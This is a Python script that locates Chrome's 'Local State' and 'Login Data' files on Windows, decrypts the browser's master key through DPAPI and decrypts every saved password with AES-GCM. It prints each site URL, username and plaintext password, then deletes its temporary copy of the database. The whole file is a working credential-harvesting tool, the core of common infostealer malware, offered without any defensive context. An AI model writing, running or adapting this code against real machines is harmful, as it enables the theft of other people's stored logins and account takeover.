import os
import json
import base64
import sqlite3
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
import shutil



def find_passwords_DB():
    '''
    The function finds the database path for a specific Google account and checks if it exists.
    '''
    # Current user folder
    user_folder = os.path.expanduser("~")
    # Finding a path to the database
    db_path = os.path.join(user_folder, "AppData", "Local", "Google", "Chrome", "User Data", "Profile 5", "Login Data")

    # Checking if the file exists
    if os.path.exists(db_path):
        print("The path to the database:", db_path)
        return db_path
    else:
        raise ValueError ("The database is not found")
    

def get_master_key():
    '''
    The function finds the encrypted key that can decrypt the passwords that Chrome stores and decrypts it.
    return master_key: The decrypted key.
    rtype master_key: Bytes.
    '''
    # Current user folder
    user_folder = os.path.expanduser("~")
    # Finding a path to the file
    file_path = os.path.join(user_folder, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    # Reads the file as text in UTF-8
    with open(file_path, "r", encoding = 'utf-8') as f:
         local_state = f.read()
         local_state = json.loads(local_state)
    # Decodes the encrypted key in the file using base64
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Removing the first 5 characters that identify the key as Data Protection API (DPAPI)
    master_key = master_key[5:]
    '''Decrypts data encrypted with DPAPI - (master_key: The encrypted data, description: Text that describes the information - 
    Chrome doesn't put anything there, optional entropy: Additional information for encryption/decryption if used - Chrome does not use this,
    reserved: Reserved for future use, always None, flags: Flags for the working mode, 0 is the default).
    result: (description, decrypted_data)'''
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    '''
    Decryption of a password using a specific defined cipher.
    '''
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    '''
    Creating an AES cipher object based on the defined key and initialization vector.
    '''
    return AES.new(aes_key, AES.MODE_GCM, iv)

        
def decrypt_password(buff: bytes, master_key: bytes):
    '''
    The function decrypts an encrypted Chrome password.
    '''
    # buff: [v10 prefix][12-byte IV][ciphertext][16-byte authentication tag (suffix bytes)]
    try:
        # Cutting IV
        iv = buff[3:15]
        # Cutting the encrypted information
        payload = buff[15:]
        # Creating an AES cipher object
        cipher = generate_cipher(master_key, iv)
        # Decoding the data
        decrypted_pass = decrypt_payload(cipher, payload)
        # remove suffix bytes
        decrypted_pass = decrypted_pass[:-16].decode() 
        return decrypted_pass
    
    except Exception as e:
        print("ERROR: " + str(e))
        # Probably saved password from Chrome version older than v80
        return "Chrome < 80"



if __name__ == "__main__":

    master_key = get_master_key()
    login_db_path = find_passwords_DB()
    # Making a temp copy since Login Data DB is locked while Chrome is running
    shutil.copy2(login_db_path, "Loginvault.db")
    # Establish a connection to the SQLite database file
    conn = sqlite3.connect("Loginvault.db")
    # Create a cursor object
    cursor = conn.cursor()

    try:
        # Takes all URLs, usernames, and passwords (encrypted) from the logins table in the database
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

        # in each line in the result
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            # Decrypting the secret password for any website
            decrypted_password = decrypt_password(encrypted_password, master_key)
            # If a username exists (length greater than 0)
            if len(username) > 0:
                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()

    try:
        # Delete the file from the computer
        os.remove("Loginvault.db")
        
    except Exception as e:
        pass